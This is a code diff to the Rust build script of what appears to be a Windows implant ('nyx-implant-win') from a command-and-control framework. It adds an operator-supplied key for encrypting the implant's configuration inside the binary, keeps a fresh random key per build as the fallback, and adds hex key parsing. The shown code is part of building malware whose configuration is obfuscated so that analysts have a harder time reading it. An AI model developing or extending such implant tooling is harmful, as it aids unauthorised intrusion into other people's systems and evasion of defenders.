@@ -28,6 +28,7 @@ use std::path::Path;
 fn main() {
     println!("cargo:rerun-if-env-changed=NYX_SERVER_PUB");
     println!("cargo:rerun-if-env-changed=NYX_CONFIG");
+    println!("cargo:rerun-if-env-changed=NYX_CONFIG_KEY");
     println!("cargo:rerun-if-env-changed=NYX_PROFILE");
 
     bake_server_pub();
@@ -116,19 +117,40 @@ fn bake_config() {
 
     let out_dir = env::var("OUT_DIR").unwrap();
 
-    // Encrypt the plaintext config blob under a FRESH per-build
-    // ChaCha20-Poly1305 key+nonce (build.rs runs on the host, std, so we use
-    // nyx_config::encrypt directly). Emit the key/nonce/ciphertext as a Rust
+    // Encrypt the plaintext config blob under a ChaCha20-Poly1305 key+nonce
+    // (build.rs runs on the host, std). Emit the key/nonce/ciphertext as a Rust
     // static the runtime `config.rs` decrypts. This is the same scheme
     // `nyx_config_macros::embed!` performs, but inlined here so we avoid the
     // proc-macro's "string literal path" requirement (OUT_DIR is only known
-    // via env!(), not a literal). Every build re-randomizes key/nonce → the
-    // static config bytes differ every build even with identical config values.
-    let (key, nonce, ct) = nyx_config::encrypt(&blob);
+    // via env!(), not a literal).
+    //
+    // Key resolution mirrors `nyx_config_macros::embed!`:
+    //   - `NYX_CONFIG_KEY=<64 hex chars>` → use that 32-byte key (operator-
+    //     supplied, e.g. a unique per-operator key). The nonce is STILL fresh
+    //     OsRng per build — nonce reuse under a fixed key would be catastrophic.
+    //   - unset → fresh OsRng key per build (legacy behaviour), but we warn so
+    //     the operator knows the key rotates every build.
+    //
+    // Either way the key ends up embedded in the SAME binary as the ciphertext
+    // — this is obfuscation, not confidentiality. See config/src/lib.rs.
+    let (key, nonce, ct) = match resolve_config_key() {
+        Ok(Some(custom)) => nyx_config::encrypt_with_key(&blob, custom),
+        Ok(None) => {
+            eprintln!(
+                "cargo:warning=nyx-implant-win: NYX_CONFIG_KEY was not set — \
+                 generating a fresh random config key for THIS build only. \
+                 The key is embedded in the binary and recoverable; reuse across \
+                 builds is NOT guaranteed. Set NYX_CONFIG_KEY=<64 hex chars> \
+                 for a stable, operator-specific key."
+            );
+            nyx_config::encrypt(&blob)
+        }
+        Err(msg) => panic!("{msg}"),
+    };
     let dest = Path::new(&out_dir).join("config_blob.rs");
     let mut src = String::new();
     src.push_str("/// Per-build encrypted implant config, baked by build.rs.\n");
-    src.push_str("/// Do not edit by hand — key/nonce/ciphertext are randomized per build.\n");
+    src.push_str("/// Do not edit by hand — key/nonce/ciphertext are baked per build.\n");
     src.push_str("pub static CONFIG_KEY: [u8; 32] = [");
     for (i, b) in key.iter().enumerate() {
         if i > 0 {
@@ -604,4 +626,56 @@ fn hex_nibble(c: u8) -> Option<u8> {
         b'A'..=b'F' => Some(c - b'A' + 10),
         _ => None,
     }
+}
+
+// ---- config key resolution (mirrors nyx_config_macros::resolve_key) --------
+
+/// Resolve the ChaCha20-Poly1305 config key from the build environment.
+///
+/// Returns:
+/// - `Ok(Some(key))` if `NYX_CONFIG_KEY` is set and parses as 64 hex chars.
+/// - `Ok(None)` if `NYX_CONFIG_KEY` is unset/empty (caller falls back to a
+///   fresh random key).
+/// - `Err(msg)` if `NYX_CONFIG_KEY` is set but malformed (surfaced as a
+///   build failure via `panic!`).
+fn resolve_config_key() -> Result<Option<[u8; 32]>, String> {
+    match env::var("NYX_CONFIG_KEY") {
+        Ok(raw) => {
+            let trimmed = raw.trim();
+            if trimmed.is_empty() {
+                Ok(None)
+            } else {
+                parse_hex_key(trimmed).map(Some)
+            }
+        }
+        Err(_) => Ok(None),
+    }
+}
+
+/// Parse 64 hex chars into a 32-byte key. Mirrors
+/// `nyx_config_macros::parse_hex_key` (no `hex` dependency).
+fn parse_hex_key(s: &str) -> Result<[u8; 32], String> {
+    if s.len() != 64 {
+        return Err(format!(
+            "NYX_CONFIG_KEY must be 64 hex chars (32 bytes), got {}",
+            s.len()
+        ));
+    }
+    let mut key = [0u8; 32];
+    for (i, pair) in s.as_bytes().chunks(2).enumerate() {
+        let hi = hex_nibble(pair[0]).ok_or_else(|| {
+            format!(
+                "NYX_CONFIG_KEY contains non-hex char {:?}",
+                pair[0] as char
+            )
+        })?;
+        let lo = hex_nibble(pair[1]).ok_or_else(|| {
+            format!(
+                "NYX_CONFIG_KEY contains non-hex char {:?}",
+                pair[1] as char
+            )
+        })?;
+        key[i] = (hi << 4) | lo;
+    }
+    Ok(key)
 }
